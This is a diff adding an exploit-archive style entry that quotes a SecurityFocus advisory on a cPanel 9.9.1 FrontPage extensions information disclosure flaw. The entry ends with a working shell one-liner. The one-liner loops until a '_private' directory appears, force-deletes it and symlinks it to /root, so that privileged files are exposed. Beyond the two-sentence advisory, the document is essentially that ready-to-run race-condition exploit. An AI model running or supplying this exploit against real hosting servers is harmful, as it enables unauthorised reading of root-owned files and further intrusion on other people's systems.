@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/11456/info
+
+It is reported that cPanel is susceptible to an information disclosure vulnerability in its function to enable Front Page extensions.
+
+This vulnerability reportedly allows attackers to gain access to the contents of arbitrary, potentially sensitive files. This may aid them in further attacks.
+
+Version 9.9.1-RELEASE-3 of cPanel was reported vulnerable. Other versions may also be affected.
+
+while [ 1 ]; do if [ -d "_private" ]; then rm -fr _private; ln -s /root _private; break; fi; done
